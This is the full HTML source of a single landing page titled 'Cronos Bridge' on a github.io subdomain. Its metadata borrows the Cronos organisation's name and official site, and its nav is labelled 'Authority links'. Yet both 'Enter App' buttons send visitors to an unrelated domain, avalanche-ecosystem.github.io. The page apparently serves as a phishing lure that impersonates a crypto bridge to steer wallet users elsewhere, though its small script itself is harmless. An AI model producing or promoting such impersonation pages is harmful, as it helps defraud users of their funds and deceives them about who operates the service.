<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cronos Bridge</title>
  <meta name="description" content="Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.">
  <link rel="canonical" href="https://cronos-bridge.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F8FA">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Cronos Bridge">
  <meta property="og:description" content="Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.">
  <meta property="og:url" content="https://cronos-bridge.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Cronos Bridge">
  <meta name="twitter:description" content="Cronos Bridge moves tokens between Ethereum and the Cronos chain from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://cronos-bridge.github.io/#website",
        "url": "https://cronos-bridge.github.io/",
        "name": "Cronos Bridge",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://cronos-bridge.github.io/#app",
        "name": "Cronos Bridge",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://cronos-bridge.github.io/"
      },
      {
        "@type": "Organization",
        "@id": "https://cronos-bridge.github.io/#organization",
        "name": "Cronos",
        "url": "https://cronos.org/",
        "sameAs": [
          "https://cronos.org/"
        ]
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="Cronos Bridge home">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Cronos Bridge</span>
    </a>
    <nav class="nav" aria-label="Authority links">
      <a href="https://cronoscan.com/" target="_blank" rel="nofollow noopener noreferrer">Cronoscan</a>
      <a href="https://cronos.org/" target="_blank" rel="nofollow noopener noreferrer">Cronos</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Cronos Bridge</h1>
      <p class="sub"><strong>Cronos Bridge</strong> moves tokens between Ethereum and the Cronos chain from your own wallet.</p>
    </section>

    <section class="card" aria-label="Bridge route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img class="icon" src="eth.png" width="30" height="30" alt="Ethereum">
            <span class="asset">Ethereum</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img class="icon" src="cro.png" width="30" height="30" alt="Cronos">
            <span class="asset">Cronos</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="foot">Cronos Bridge &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;

      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  }());
  </script>
</body>
</html>
